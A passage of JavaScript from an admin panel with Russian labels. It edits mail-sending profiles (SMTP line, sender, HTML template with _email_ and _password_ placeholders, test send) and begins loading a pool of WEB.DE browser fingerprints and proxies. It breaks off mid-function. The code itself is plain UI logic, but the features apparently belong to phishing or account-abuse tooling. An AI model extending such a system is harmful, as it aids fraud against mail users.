        var imgFile = document.getElementById('config-mailer-image-file');
        if (imgFile) imgFile.value = '';
        var imgStatus = document.getElementById('config-mailer-image-status');
        if (imgStatus) imgStatus.textContent = 'Картинка будет удалена после сохранения.';
      });
    }

    var CONFIG_EMAIL_NEW_ID = '__new__';
    var adminConfigEmailPendingImage = null;
    var adminConfigEmailPendingImageDataUrl = null;
    var adminConfigEmailSavedImageDataUrl = null;
    var adminConfigEmailVisualMode = false;
    var adminConfigEmailPreviewViewport = 'desktop';
    var configEmailPreviewTimer = null;
    var configEmailPreviewBlobUrl = null;
    var configEmailVisualInputTimer = null;
    var configEmailAutoSaveTimer = null;
    var adminConfigEmailHydrating = false;
    /** Игнорировать ответ GET /api/config/email, если уже начали новую загрузку (не затирать правки пользователя). */
    var configEmailLoadGeneration = 0;
    var configEmailSaveInFlight = false;
    var configEmailSaveAgain = false;
    var adminConfigEmailSyncingFromPreview = false;

    function escapeHtmlPreview(s) {
      return String(s == null ? '' : s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    }
    function smtpGuessFromEmail(smtpLine) {
      var raw = String(smtpLine || '').trim();
      var lines = raw.split(/\r?\n/).map(function (s) { return s.trim(); }).filter(Boolean);
      var first = lines.length ? lines[0] : raw;
      var p = String(first).split(':');
      if (p.length < 5) return '';
      var cand = String(p[3] || '').trim();
      if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cand)) return cand;
      return '';
    }
    function formatPreviewFrom(senderName, smtpLine) {
      var email = smtpGuessFromEmail(smtpLine);
      var name = String(senderName || '').trim();
      if (name && email) return name + ' <' + email + '>';
      if (email) return email;
      if (name) return name;
      return '—';
    }
    function parseEmailTemplateParts(html) {
      var s = String(html || '').trim();
      if (!s) {
        return {
          headInner: '<meta charset="utf-8">',
          bodyInner: '<p style="margin:0;color:#888;font:15px system-ui,sans-serif">Пустой шаблон</p>'
        };
      }
      var head = s.slice(0, Math.min(900, s.length)).toLowerCase();
      if (head.indexOf('<html') >= 0 || head.indexOf('<!doctype') >= 0) {
        try {
          var doc = new DOMParser().parseFromString(s, 'text/html');
          return {
            headInner: doc && doc.head ? doc.head.innerHTML : '<meta charset="utf-8">',
            bodyInner: doc && doc.body ? doc.body.innerHTML : s
          };
        } catch (e) { /* fallthrough */ }
      }
      return { headInner: '<meta charset="utf-8">', bodyInner: s };
    }
    function mergeBodyIntoStoredHtml(storedFull, bodyInnerFromPreview) {
      var s = String(storedFull || '').trim();
      if (!s) {
        return '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>' + bodyInnerFromPreview + '</body></html>';
      }
      try {
        var d = new DOMParser().parseFromString(s, 'text/html');
        var headHtml = d.head ? d.head.innerHTML : '<meta charset="utf-8">';
        return '<!DOCTYPE html><html><head>' + headHtml + '</head><body>' + bodyInnerFromPreview + '</body></html>';
      } catch (e2) {
        return s;
      }
    }
    function getPreviewRootHtml(doc) {
      if (!doc || !doc.body) return '';
      var root = doc.querySelector('.preview-root');
      return root ? root.innerHTML : doc.body.innerHTML;
    }
    function placeholderSrc1DataUri() {
      var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="140" height="36"><rect fill="#e5e7eb" width="140" height="36" rx="6"/><text x="70" y="23" text-anchor="middle" fill="#64748b" font-size="12" font-family="system-ui,sans-serif">_src1_</text></svg>';
      return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
    }
    var CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY = 'gmw_admin_config_email_preview_to';
    var configEmailPreviewToPersistTimer = null;
    function extractRecipientEmailPreview(raw) {
      var t = String(raw || '').trim();
      if (!t) return '';
      var angle = t.match(/<([^\s<>]+@[^\s<>]+)>/);
      if (angle) return angle[1].trim().toLowerCase();
      var bare = t.match(/[^\s<>]+@[^\s<>]+\.[^\s<>]+/);
      if (bare) return bare[0].trim().toLowerCase();
      return '';
    }
    function getConfigEmailPreviewEmailToken() {
      var el = document.getElementById('config-email-preview-to');
      var raw = el && el.value ? el.value.trim() : '';
      var ex = extractRecipientEmailPreview(raw);
      if (ex) return ex;
      if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw)) return raw.toLowerCase();
      return raw ? raw : 'recipient@example.com';
    }
    function persistConfigEmailPreviewTo() {
      try {
        var el = document.getElementById('config-email-preview-to');
        if (el) localStorage.setItem(CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY, el.value || '');
      } catch (e) {}
    }
    function schedulePersistConfigEmailPreviewTo() {
      if (configEmailPreviewToPersistTimer) clearTimeout(configEmailPreviewToPersistTimer);
      configEmailPreviewToPersistTimer = setTimeout(function () {
        configEmailPreviewToPersistTimer = null;
        persistConfigEmailPreviewTo();
      }, 350);
    }
    function applyEmailPreviewSubstitutions(html, pendingDataUrl, savedDataUrl, isClearPending, previewEmailToken) {
      var h = String(html || '');
      var em = String(previewEmailToken || '').trim() || 'recipient@example.com';
      h = h.replace(/_email_/gi, em);
      h = h.replace(/_password_/gi, '••••••••');
      if (isClearPending) {
        h = h.replace(/_src1_/gi, '');
      } else if (pendingDataUrl) {
        h = h.replace(/_src1_/gi, pendingDataUrl);
      } else if (savedDataUrl) {
        h = h.replace(/_src1_/gi, savedDataUrl);
      } else {
        h = h.replace(/_src1_/gi, placeholderSrc1DataUri());
      }
      return h;
    }
    function setConfigEmailVisualUi() {
      var btn = document.getElementById('config-email-preview-edit-toggle');
      var hint = document.getElementById('config-email-preview-mode-hint');
      if (btn) {
        btn.textContent = adminConfigEmailVisualMode ? 'Закончить правку' : 'Правка в превью';
        btn.classList.toggle('is-active', adminConfigEmailVisualMode);
      }
      if (hint) {
        hint.textContent = adminConfigEmailVisualMode ? 'Правки пишутся в HTML · Esc' : '';
      }
    }
    function setConfigEmailPreviewViewportUi() {
      var wrap = document.getElementById('config-email-preview-frame-wrap');
      var btn = document.getElementById('config-email-preview-viewport-toggle');
      var icoPhone = btn && btn.querySelector('.config-email-preview-vp-ico--phone');
      var icoPc = btn && btn.querySelector('.config-email-preview-vp-ico--pc');
      var isMobile = adminConfigEmailPreviewViewport === 'mobile';
      if (wrap) wrap.classList.toggle('config-email-preview-frame-wrap--mobile', isMobile);
      if (btn) {
        btn.classList.toggle('is-active', isMobile);
        btn.setAttribute('aria-pressed', isMobile ? 'true' : 'false');
        var labelPc = 'Предпросмотр как на ПК';
        var labelPh = 'Предпросмотр как на телефоне';
        btn.setAttribute('aria-label', isMobile ? labelPc : labelPh);
        btn.setAttribute('title', isMobile ? labelPc : labelPh);
      }
      if (icoPhone) icoPhone.classList.toggle('hidden', isMobile);
      if (icoPc) icoPc.classList.toggle('hidden', !isMobile);
    }
    function syncVisualPreviewToTextarea() {
      var frame = document.getElementById('config-email-preview-frame');
      var htmlEl = document.getElementById('config-email-html');
      if (!frame || !htmlEl) return;
      try {
        var doc = frame.contentDocument;
        if (!doc) return;
        var inner = getPreviewRootHtml(doc);
        adminConfigEmailSyncingFromPreview = true;
        htmlEl.value = mergeBodyIntoStoredHtml(htmlEl.value, inner);
      } catch (e) {}
      finally {
        requestAnimationFrame(function () { adminConfigEmailSyncingFromPreview = false; });
      }
    }
    function onVisualPreviewInput() {
      if (configEmailVisualInputTimer) clearTimeout(configEmailVisualInputTimer);
      configEmailVisualInputTimer = setTimeout(function () {
        configEmailVisualInputTimer = null;
        syncVisualPreviewToTextarea();
      }, 220);
    }
    function attachVisualModeToFrame(frame) {
      if (!frame || !adminConfigEmailVisualMode) return;
      try {
        var doc = frame.contentDocument;
        if (!doc || !doc.body) return;
        doc.designMode = 'on';
        doc.body.addEventListener('input', onVisualPreviewInput);
        doc.body.addEventListener('keyup', onVisualPreviewInput);
      } catch (e2) {}
    }
    function detachVisualModeFromFrame(frame) {
      if (!frame) return;
      try {
        var doc = frame.contentDocument;
        if (doc && doc.body) {
          doc.designMode = 'off';
          doc.body.removeEventListener('input', onVisualPreviewInput);
          doc.body.removeEventListener('keyup', onVisualPreviewInput);
        }
      } catch (e3) {}
    }
    function updateConfigEmailPreview(opts) {
      var force = opts && opts.force;
      var frame = document.getElementById('config-email-preview-frame');
      var heroMount = document.getElementById('config-email-preview-hero-mount');
      if (!frame || !heroMount) return;
      if (adminConfigEmailVisualMode && !force) return;
      var fromEl = document.getElementById('config-email-from');
      var subjectEl = document.getElementById('config-email-subject');
      var htmlEl = document.getElementById('config-email-html');
      var smtpEl = document.getElementById('config-email-smtp');
      var sender = (fromEl && fromEl.value) ? fromEl.value.trim() : '';
      var sub = (subjectEl && subjectEl.value) ? subjectEl.value.trim() : '';
      var smtpLine = (smtpEl && smtpEl.value) ? smtpEl.value.trim() : '';
      var emailAddr = smtpGuessFromEmail(smtpLine);
      var av = (sender || emailAddr || '?').charAt(0).toUpperCase();
      heroMount.innerHTML =
        '<div class="config-email-preview-hero">' +
          '<div class="config-email-preview-hero__avatar" aria-hidden="true">' + escapeHtmlPreview(av) + '</div>' +
          '<div class="config-email-preview-hero__meta">' +
            '<div class="config-email-preview-hero__name">' + escapeHtmlPreview(sender || emailAddr || '—') + '</div>' +
            (emailAddr ? '<div class="config-email-preview-hero__email">' + escapeHtmlPreview(emailAddr) + '</div>' : '') +
            '<div class="config-email-preview-hero__subject"><span class="config-email-preview-hero__subj-label">Тема</span> ' + escapeHtmlPreview(sub || '—') + '</div>' +
          '</div></div>';
      var rawHtml = (htmlEl && htmlEl.value) ? htmlEl.value : '';
      var parts = parseEmailTemplateParts(rawHtml);
      var clearImg = adminConfigEmailPendingImage === '__clear__';
      var pendingUrl = adminConfigEmailPendingImageDataUrl;
      var savedUrl = adminConfigEmailSavedImageDataUrl;
      var previewEm = getConfigEmailPreviewEmailToken();
      var bodyInner = applyEmailPreviewSubstitutions(parts.bodyInner, pendingUrl, savedUrl, clearImg, previewEm);
      var wrapStyle = 'html,body{margin:0;padding:0;background:#fff;} .preview-root{background:#fff;max-width:100%;min-height:100%;padding:10px 12px;box-sizing:border-box;margin:0;border-radius:0;box-shadow:none;}';
      var shell = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">' +
        parts.headInner +
        '<style id="gmw-preview-base">' + wrapStyle + '</style></head><body><div class="preview-root">' + bodyInner + '</div></body></html>';
      if (configEmailPreviewBlobUrl) {
        try { URL.revokeObjectURL(configEmailPreviewBlobUrl); } catch (rev) {}
        configEmailPreviewBlobUrl = null;
      }
      frame.onload = function () {
        frame.onload = null;
        attachVisualModeToFrame(frame);
      };
      try {
        var blob = new Blob([shell], { type: 'text/html;charset=utf-8' });
        configEmailPreviewBlobUrl = URL.createObjectURL(blob);
        frame.src = configEmailPreviewBlobUrl;
      } catch (blobErr) {
        frame.removeAttribute('src');
        frame.srcdoc = shell;
        attachVisualModeToFrame(frame);
      }
    }
    function scheduleConfigEmailPreview() {
      if (configEmailPreviewTimer) clearTimeout(configEmailPreviewTimer);
      configEmailPreviewTimer = setTimeout(function () {
        configEmailPreviewTimer = null;
        updateConfigEmailPreview();
      }, 48);
    }
    function showConfigEmailMsg(text, type) {
      var el = document.getElementById('config-email-message');
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-msg' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }
    function flushConfigEmailAutoSaveTimer() {
      if (configEmailAutoSaveTimer) {
        clearTimeout(configEmailAutoSaveTimer);
        configEmailAutoSaveTimer = null;
      }
    }
    function buildConfigEmailSavePayload(includeHtml) {
      var sel = document.getElementById('config-email-profile');
      var smtp = document.getElementById('config-email-smtp');
      var from = document.getElementById('config-email-from');
      var subject = document.getElementById('config-email-subject');
      var htmlEl = document.getElementById('config-email-html');
      var nameInput = document.getElementById('config-email-profile-name');
      var isNew = !sel || sel.value === CONFIG_EMAIL_NEW_ID;
      var payload = {
        smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
        senderName: (from && from.value) ? from.value.trim() : '',
        title: (subject && subject.value) ? subject.value.trim() : '',
        setCurrent: true
      };
      if (includeHtml) payload.html = (htmlEl && htmlEl.value) ? htmlEl.value : '';
      if (isNew) {
        payload.name = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('E-Mail ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
      } else {
        payload.id = sel.value;
      }
      if (adminConfigEmailPendingImage === '__clear__') payload.image1Base64 = '';
      else if (typeof adminConfigEmailPendingImage === 'string' && adminConfigEmailPendingImage.length) payload.image1Base64 = adminConfigEmailPendingImage;
      return { payload: payload, isNew: isNew };
    }
    function scheduleConfigEmailAutoSave() {
      if (adminConfigEmailHydrating) return;
      if (configEmailAutoSaveTimer) clearTimeout(configEmailAutoSaveTimer);
      configEmailAutoSaveTimer = setTimeout(function () {
        configEmailAutoSaveTimer = null;
        saveConfigEmailFromUi({ silent: true });
      }, 700);
    }
    function saveConfigEmailFromUi(opts) {
      opts = opts || {};
      if (adminConfigEmailHydrating) return Promise.resolve();
      var includeHtml;
      if (opts.includeHtml === true) includeHtml = true;
      else if (opts.includeHtml === false) includeHtml = false;
      else includeHtml = !adminConfigEmailVisualMode;
      var built = buildConfigEmailSavePayload(includeHtml);
      var payload = built.payload;
      var wasNew = built.isNew;
      if (configEmailSaveInFlight) {
        configEmailSaveAgain = true;
        return Promise.resolve();
      }
      configEmailSaveInFlight = true;
      return postJson('/api/config/email', payload)
        .then(parseJsonResponseThrowIfNotOk)
        .then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          adminConfigEmailPendingImage = null;
          adminConfigEmailPendingImageDataUrl = null;
          var imgFile = document.getElementById('config-email-image-file');
          if (imgFile) imgFile.value = '';
          if (wasNew) {
            loadConfigEmail();
            return;
          }
          if (data && data.image1DataUrl !== undefined) {
            adminConfigEmailSavedImageDataUrl = (data.image1DataUrl && String(data.image1DataUrl).trim()) || '';
          }
          var imgStatus = document.getElementById('config-email-image-status');
          if (imgStatus && data && data.image1Present !== undefined) {
            imgStatus.textContent = data.image1Present ? '_src1_: есть' : '_src1_: нет';
          }
          var sel = document.getElementById('config-email-profile');
          var nameInput = document.getElementById('config-email-profile-name');
          if (sel && nameInput && sel.value && sel.value !== CONFIG_EMAIL_NEW_ID) {
            for (var oi = 0; oi < sel.options.length; oi++) {
              if (sel.options[oi].value === sel.value) {
                sel.options[oi].textContent = nameInput.value.trim() || sel.options[oi].textContent;
                break;
              }
            }
          }
          scheduleConfigEmailPreview();
          if (!opts.silent) showConfigEmailMsg('Сохранено', 'success');
        })
        .catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка сохранения', 'error');
        })
        .finally(function () {
          configEmailSaveInFlight = false;
          if (configEmailSaveAgain) {
            configEmailSaveAgain = false;
            saveConfigEmailFromUi({ silent: true });
          }
        });
    }
    function loadConfigEmail() {
      var loadGen = ++configEmailLoadGeneration;
      var sel = document.getElementById('config-email-profile');
      var smtp = document.getElementById('config-email-smtp');
      var from = document.getElementById('config-email-from');
      var subject = document.getElementById('config-email-subject');
      var htmlEl = document.getElementById('config-email-html');
      var nameInput = document.getElementById('config-email-profile-name');
      var imgStatus = document.getElementById('config-email-image-status');
      var delBtn = document.getElementById('config-email-delete');
      adminConfigEmailHydrating = true;
      adminConfigEmailPendingImage = null;
      adminConfigEmailPendingImageDataUrl = null;
      var imgFile = document.getElementById('config-email-image-file');
      if (imgFile) imgFile.value = '';
      authFetch('/api/config/email').then(parseJsonResponseThrowIfNotOk).then(function (data) {
        if (loadGen !== configEmailLoadGeneration) return;
        var list = data.list || [];
        var currentId = data.currentId || null;
        if (sel) {
          sel.innerHTML = '';
          var optNew = document.createElement('option');
          optNew.value = CONFIG_EMAIL_NEW_ID;
          optNew.textContent = '+ Новый профиль';
          sel.appendChild(optNew);
          list.forEach(function (item) {
            var opt = document.createElement('option');
            opt.value = item.id;
            opt.textContent = item.name || item.id;
            sel.appendChild(opt);
          });
          if (currentId && list.some(function (x) { return String(x.id) === String(currentId); })) {
            sel.value = currentId;
          } else {
            sel.value = list.length ? list[0].id : CONFIG_EMAIL_NEW_ID;
          }
        }
        if (smtp) smtp.value = data.smtpLine || '';
        if (from) from.value = data.senderName || '';
        if (subject) subject.value = data.title || '';
        if (htmlEl) htmlEl.value = data.html || '';
        if (nameInput) {
          var cur = list.find(function (i) { return String(i.id) === String(data.currentId); });
          nameInput.value = (cur && (cur.name || cur.id)) ? (cur.name || cur.id) : '';
        }
        if (imgStatus) {
          imgStatus.textContent = data.image1Present ? '_src1_: есть' : '_src1_: нет';
        }
        adminConfigEmailSavedImageDataUrl = (data.image1DataUrl && String(data.image1DataUrl).trim()) || '';
        if (delBtn) delBtn.disabled = sel && sel.value === CONFIG_EMAIL_NEW_ID;
        showConfigEmailMsg('', '');
        AdminModalKit.syncCodeEditorHeights();
        var toIn = document.getElementById('config-email-preview-to');
        if (toIn) {
          try {
            var st = localStorage.getItem(CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY);
            if (st != null) toIn.value = st;
          } catch (e2) {}
        }
        scheduleConfigEmailPreview();
      }).catch(function (err) {
        if (loadGen !== configEmailLoadGeneration) return;
        showConfigEmailMsg(err.message || 'Ошибка загрузки E-Mail', 'error');
        scheduleConfigEmailPreview();
      }).finally(function () {
        if (loadGen !== configEmailLoadGeneration) return;
        requestAnimationFrame(function () {
          adminConfigEmailHydrating = false;
        });
      });
    }
    var configEmailProfileSel = document.getElementById('config-email-profile');
    if (configEmailProfileSel) {
      configEmailProfileSel.addEventListener('change', function () {
        var v = configEmailProfileSel.value;
        var delBtn = document.getElementById('config-email-delete');
        if (delBtn) delBtn.disabled = v === CONFIG_EMAIL_NEW_ID;
        if (v === CONFIG_EMAIL_NEW_ID) {
          var smtp = document.getElementById('config-email-smtp');
          var from = document.getElementById('config-email-from');
          var subject = document.getElementById('config-email-subject');
          var htmlEl = document.getElementById('config-email-html');
          var nameInput = document.getElementById('config-email-profile-name');
          if (smtp) smtp.value = '';
          if (from) from.value = '';
          if (subject) subject.value = '';
          if (htmlEl) htmlEl.value = '';
          if (nameInput) nameInput.value = '';
          adminConfigEmailPendingImage = null;
          adminConfigEmailPendingImageDataUrl = null;
          adminConfigEmailSavedImageDataUrl = '';
          showConfigEmailMsg('Новый профиль: данные сохранятся автоматически.', 'success');
          setTimeout(function () { showConfigEmailMsg('', ''); }, 2800);
          scheduleConfigEmailPreview();
          return;
        }
        postJson('/api/config/email/select', { id: v }).then(function () {
          loadConfigEmail();
        }).catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка выбора профиля', 'error');
        });
      });
    }
    var configEmailNewBtn = document.getElementById('config-email-new');
    if (configEmailNewBtn) {
      configEmailNewBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-email-profile');
        if (sel) sel.value = CONFIG_EMAIL_NEW_ID;
        var smtp = document.getElementById('config-email-smtp');
        var from = document.getElementById('config-email-from');
        var subject = document.getElementById('config-email-subject');
        var htmlEl = document.getElementById('config-email-html');
        var nameInput = document.getElementById('config-email-profile-name');
        if (smtp) smtp.value = '';
        if (from) from.value = '';
        if (subject) subject.value = '';
        if (htmlEl) htmlEl.value = '';
        if (nameInput) nameInput.value = '';
        adminConfigEmailPendingImage = null;
        adminConfigEmailPendingImageDataUrl = null;
        adminConfigEmailSavedImageDataUrl = '';
        var delBtn = document.getElementById('config-email-delete');
        if (delBtn) delBtn.disabled = true;
        showConfigEmailMsg('Новый профиль: данные сохранятся автоматически.', 'success');
        setTimeout(function () { showConfigEmailMsg('', ''); }, 2800);
        scheduleConfigEmailPreview();
      });
    }
    var configEmailDelBtn = document.getElementById('config-email-delete');
    if (configEmailDelBtn) {
      configEmailDelBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-email-profile');
        var id = sel && sel.value;
        if (!id || id === CONFIG_EMAIL_NEW_ID) return;
        if (!confirm('Удалить профиль E-Mail «' + id + '»?')) return;
        authFetch('/api/config/email?id=' + encodeURIComponent(id), { method: 'DELETE' }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showConfigEmailMsg('Профиль удалён', 'success');
          loadConfigEmail();
        }).catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка удаления', 'error');
        });
      });
    }
    var configEmailTplFile = document.getElementById('config-email-template-file');
    if (configEmailTplFile) {
      configEmailTplFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var htmlEl = document.getElementById('config-email-html');
          if (htmlEl) htmlEl.value = reader.result || '';
          showConfigEmailMsg('HTML из файла — сохранится автоматически.', 'success');
          setTimeout(function () { showConfigEmailMsg('', ''); }, 2200);
          scheduleConfigEmailPreview();
          flushConfigEmailAutoSaveTimer();
          saveConfigEmailFromUi({ silent: true });
        };
        reader.readAsText(f);
      });
    }
    var configEmailImgFile = document.getElementById('config-email-image-file');
    if (configEmailImgFile) {
      configEmailImgFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        var imgStatus = document.getElementById('config-email-image-status');
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var s = reader.result;
          adminConfigEmailPendingImageDataUrl = typeof s === 'string' ? s : null;
          var b64 = typeof s === 'string' && s.indexOf(',') >= 0 ? s.split(',')[1] : '';
          adminConfigEmailPendingImage = b64;
          if (imgStatus) imgStatus.textContent = '_src1_: новый файл · сохранится';
          scheduleConfigEmailPreview();
          flushConfigEmailAutoSaveTimer();
          saveConfigEmailFromUi({ silent: true });
        };
        reader.readAsDataURL(f);
      });
    }
    var configEmailImgClear = document.getElementById('config-email-image-clear');
    if (configEmailImgClear) {
      configEmailImgClear.addEventListener('click', function () {
        adminConfigEmailPendingImage = '__clear__';
        adminConfigEmailPendingImageDataUrl = null;
        var imgFile = document.getElementById('config-email-image-file');
        if (imgFile) imgFile.value = '';
        var imgStatus = document.getElementById('config-email-image-status');
        if (imgStatus) imgStatus.textContent = '_src1_: сброс · сохранится';
        scheduleConfigEmailPreview();
        flushConfigEmailAutoSaveTimer();
        saveConfigEmailFromUi({ silent: true });
      });
    }
    var configEmailProfileName = document.getElementById('config-email-profile-name');
    if (configEmailProfileName) {
      configEmailProfileName.addEventListener('input', function () {
        scheduleConfigEmailPreview();
        scheduleConfigEmailAutoSave();
      });
    }
    ['config-email-from', 'config-email-subject', 'config-email-smtp'].forEach(function (id) {
      var el = document.getElementById(id);
      if (el) el.addEventListener('input', function () {
        scheduleConfigEmailPreview();
        scheduleConfigEmailAutoSave();
      });
    });
    var configEmailHtmlTa = document.getElementById('config-email-html');
    if (configEmailHtmlTa) {
      configEmailHtmlTa.addEventListener('input', function () {
        if (adminConfigEmailSyncingFromPreview) return;
        if (adminConfigEmailVisualMode) {
          var fr = document.getElementById('config-email-preview-frame');
          detachVisualModeFromFrame(fr);
          adminConfigEmailVisualMode = false;
          setConfigEmailVisualUi();
        }
        scheduleConfigEmailPreview();
        scheduleConfigEmailAutoSave();
      });
    }
    var configEmailPreviewViewportToggle = document.getElementById('config-email-preview-viewport-toggle');
    if (configEmailPreviewViewportToggle) {
      configEmailPreviewViewportToggle.addEventListener('click', function () {
        adminConfigEmailPreviewViewport = adminConfigEmailPreviewViewport === 'mobile' ? 'desktop' : 'mobile';
        setConfigEmailPreviewViewportUi();
      });
    }
    var configEmailPreviewTo = document.getElementById('config-email-preview-to');
    if (configEmailPreviewTo) {
      configEmailPreviewTo.addEventListener('input', function () {
        schedulePersistConfigEmailPreviewTo();
        scheduleConfigEmailPreview();
      });
    }
    var configEmailPreviewSend = document.getElementById('config-email-preview-send');
    if (configEmailPreviewSend) {
      configEmailPreviewSend.addEventListener('click', function () {
        var toEl = document.getElementById('config-email-preview-to');
        var toRaw = toEl && toEl.value ? toEl.value.trim() : '';
        if (!toRaw) {
          showConfigEmailMsg('Укажите email в поле «Кому»', 'error');
          return;
        }
        var toNorm = extractRecipientEmailPreview(toRaw);
        if (!toNorm && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(toRaw)) toNorm = toRaw.toLowerCase();
        if (!toNorm) {
          showConfigEmailMsg('Некорректный email в поле «Кому»', 'error');
          return;
        }
        var fr = document.getElementById('config-email-preview-frame');
        if (adminConfigEmailVisualMode) {
          syncVisualPreviewToTextarea();
          detachVisualModeFromFrame(fr);
          adminConfigEmailVisualMode = false;
          setConfigEmailVisualUi();
        }
        flushConfigEmailAutoSaveTimer();
        configEmailPreviewSend.disabled = true;
        saveConfigEmailFromUi({ silent: true, includeHtml: true })
          .then(function () {
            return postJson('/api/config/email/send-test', { to: toRaw });
          })
          .then(parseJsonResponseThrowIfNotOk)
          .then(function (data) {
            showConfigEmailMsg('Отправлено: ' + (data.fromEmail || '') + ' → ' + (data.toEmail || toNorm), 'success');
            updateConfigEmailPreview({ force: true });
          })
          .catch(function (err) {
            showConfigEmailMsg(err.message || 'Ошибка отправки', 'error');
          })
          .finally(function () {
            configEmailPreviewSend.disabled = false;
          });
      });
    }
    var configEmailPreviewEditToggle = document.getElementById('config-email-preview-edit-toggle');
    if (configEmailPreviewEditToggle) {
      configEmailPreviewEditToggle.addEventListener('click', function () {
        var fr = document.getElementById('config-email-preview-frame');
        if (adminConfigEmailVisualMode) {
          syncVisualPreviewToTextarea();
          detachVisualModeFromFrame(fr);
          adminConfigEmailVisualMode = false;
          setConfigEmailVisualUi();
          updateConfigEmailPreview();
          flushConfigEmailAutoSaveTimer();
          saveConfigEmailFromUi({ silent: true, includeHtml: true });
        } else {
          adminConfigEmailVisualMode = true;
          setConfigEmailVisualUi();
          updateConfigEmailPreview({ force: true });
        }
      });
    }
    document.addEventListener('keydown', function (ev) {
      if (ev.key !== 'Escape' || !adminConfigEmailVisualMode) return;
      var pane = document.getElementById('config-pane-email');
      if (!pane || !pane.classList.contains('active')) return;
      ev.preventDefault();
      ev.stopPropagation();
      var fr = document.getElementById('config-email-preview-frame');
      syncVisualPreviewToTextarea();
      detachVisualModeFromFrame(fr);
      adminConfigEmailVisualMode = false;
      setConfigEmailVisualUi();
      updateConfigEmailPreview();
      flushConfigEmailAutoSaveTimer();
      saveConfigEmailFromUi({ silent: true, includeHtml: true });
    }, true);
    setConfigEmailVisualUi();
    setConfigEmailPreviewViewportUi();

    // proxies textarea is hidden; editor is rendered into the list (module `admin-config-pane-proxies.js`).
    function applyWebdeFpListPayload(pool, rawText, opts) {
      opts = opts || {};
      if (!opts.preserveListMessage) {
        showWebdeFpListMessage('', '');
      }
      if (pool && Array.isArray(pool.entries) && pool.entries.length > 0) {
        renderConfigWebdeFpList({ entries: pool.entries });
        return;
      }
      if (pool) {
        if (pool.filePresent === false) {
          showWebdeFpListMessage('На сервере нет файла login/webde_fingerprints.json. Список индексов — из webde_fingerprint_indices.txt на сервере (если задан).', 'error');
        } else if (pool.parseError) {
          showWebdeFpListMessage('Ошибка чтения пула: ' + String(pool.parseError) + '.', 'error');
        } else if (pool.poolLength === 0) {
          showWebdeFpListMessage('Пул отпечатков в JSON пуст.', 'error');
        }
        var fb = parseWebdeFpIndicesFromText(rawText);
        if (fb.length > 0) {
          renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fb) });
        } else {
          renderConfigWebdeFpList({ entries: [] });
        }
        return;
      }
      if (!opts.skipGenericNoPoolMsg) {
        showWebdeFpListMessage('Ответ 200 без поля pool: на сервере старая версия server.js или кэш (обновите процесс Node и сделайте жёсткое обновление страницы). Если уже новая версия — проверьте nginx proxy_buffers на пути к Node.', 'error');
      }
      var fbNoPool = parseWebdeFpIndicesFromText(rawText);
      if (fbNoPool.length > 0) {
        renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fbNoPool) });
      } else {
        renderConfigWebdeFpList({ entries: [] });
      }
    }
    function parseAdminConfigResponse(r, txt) {
      var data = {};
      var parseErr = null;
      try {
        data = JSON.parse(txt);
      } catch (eJ) {
        parseErr = (eJ && eJ.message) ? String(eJ.message) : 'parse_error';
        data = {};
      }
      return { ok: r.ok, status: r.status, data: data || {}, txtLen: (txt || '').length, parseErr: parseErr };
    }
    var webdeFpIndicesContentFromServer = '';
    function getWebdeFpIndicesTextarea() {
      return String(webdeFpIndicesContentFromServer || '');
    }
    function loadConfigWebdeFpIndices() {
      function renderFpFallbackRowsOnly() {
        var fb = parseWebdeFpIndicesFromText(webdeFpIndicesContentFromServer);
        if (fb.length > 0) {
          renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fb) });
        } else {
          renderConfigWebdeFpList({ entries: [] });
        }
      }
      function tryWebdeFpViaValidateBundle() {
        var bundleBase = '/api/config/proxies-validate?webdeFpBundle=1&nc=';
        function applyIfOk(w3) {
          var d3 = w3.data || {};
          var wi3 = d3.webdeIndices;
          if (w3.ok && !w3.parseErr && wi3 && wi3.pool) {
            showWebdeFpListMessage('', '');
            webdeFpIndicesContentFromServer = (wi3.content != null ? String(wi3.content) : '').trim();
            applyWebdeFpListPayload(wi3.pool, webdeFpIndicesContentFromServer);
            return true;
          }
          return false;
        }
        function failBoth(wGet, wPost) {
          var parts = [];
          if (!wGet.ok) parts.push('GET bundle HTTP ' + wGet.status);
          else if (wGet.parseErr) parts.push('GET bundle не JSON (длина ' + wGet.txtLen + ')');
          else parts.push('GET без webdeIndices.pool');
          if (wPost) {
            if (!wPost.ok) parts.push('POST bundle HTTP ' + wPost.status);
            else if (wPost.parseErr) parts.push('POST bundle не JSON (длина ' + wPost.txtLen + ')');
            else parts.push('POST без webdeIndices.pool');
          }
          showWebdeFpListMessage(parts.join('; ') + '. Задеплойте актуальный server.js и перезапустите Node.', 'error');
          renderFpFallbackRowsOnly();
        }
        var urlGet = bundleBase + Date.now();
        return authFetch(urlGet)
          .then(function (r3) {
